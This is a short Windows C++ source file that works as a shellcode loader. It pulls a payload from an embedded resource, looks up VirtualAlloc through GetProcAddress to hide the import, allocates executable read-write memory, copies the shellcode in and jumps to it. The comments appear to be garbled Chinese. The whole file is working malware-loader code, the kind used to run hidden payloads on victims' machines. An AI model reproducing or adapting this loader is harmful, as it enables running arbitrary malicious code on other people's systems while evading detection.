#include"public.hpp"

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	//1.��ȡshellcode
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}
	//2.����shellcode�ռ�
	pfnVirtualAlloc fnVirtualAlloc = (pfnVirtualAlloc)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualAlloc");
	LPVOID Memory = fnVirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, shellcode,shellcodeSize);
	//3.ִ��shellcode
	((void(*)())Memory)();
	return 0;
}
